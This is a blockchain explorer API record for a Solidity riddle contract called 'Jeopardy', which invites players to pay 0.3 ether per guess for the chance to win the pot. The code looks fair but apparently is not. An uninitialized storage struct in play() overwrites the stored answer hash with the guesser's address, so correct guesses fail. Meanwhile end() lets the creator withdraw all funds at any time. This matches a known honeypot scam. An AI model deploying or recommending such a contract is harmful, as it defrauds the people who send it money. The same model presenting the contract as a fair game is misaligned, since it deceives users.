{"status": "1", "message": "OK", "result": [{"SourceCode": "pragma solidity ^0.4.24;\r\n\r\ncontract Jeopardy {\r\n    bytes32 private answerHash;\r\n    bool private isActive;\r\n    Guess[] public guesses;\r\n    string public riddle;\r\n    string public answer;\r\n\r\n    struct Guess { address player; string guess; }\r\n    address private riddler;\r\n\r\n    function () payable public {}\r\n    \r\n    constructor (string _riddle, bytes32 _answerHash) public payable {\r\n        riddler = msg.sender;\r\n        riddle = _riddle;\r\n        answerHash = _answerHash;\r\n        isActive = true;\r\n    }\r\n\r\n    function play(string guess) public payable {\r\n        require(isActive);\r\n        require(msg.value >= 0.3 ether);\r\n        require(bytes(guess).length > 0);\r\n        \r\n        Guess newGuess;\r\n        newGuess.player = msg.sender;\r\n        newGuess.guess = guess;\r\n        guesses.push(newGuess);\r\n        \r\n        if (keccak256(guess) == answerHash) {\r\n            answer = guess;\r\n            isActive = false;\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n    \r\n    function end(string _answer) public {\r\n        require(msg.sender == riddler);\r\n        answer = _answer;\r\n        isActive = false;\r\n        msg.sender.transfer(this.balance);\r\n    }\r\n}", "ABI": "[{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"guesses\",\"outputs\":[{\"name\":\"player\",\"type\":\"address\"},{\"name\":\"guess\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"riddle\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"guess\",\"type\":\"string\"}],\"name\":\"play\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"answer\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_answer\",\"type\":\"string\"}],\"name\":\"end\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"_riddle\",\"type\":\"string\"},{\"name\":\"_answerHash\",\"type\":\"bytes32\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]", "ContractName": "Jeopardy", "CompilerVersion": "v0.4.24+commit.e67f0147", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000000000000000000000000000000000000000000040d62171d5887ffaa4b3d78fa735c098b7a6f2b7020458aaf0dc059853ff4f0baa0000000000000000000000000000000000000000000000000000000000000062497427732073686f72746572207468616e2074686520726573742c20627574207768656e20796f752772652068617070792c20796f75207261697365206974207570206c696b6520697427732074686520626573742e20576861742069732069743f000000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://934c2d3c90b1b3fe060fe43f0c450ef15687f6734bc26ee5e1dc15c06448c37f"}]}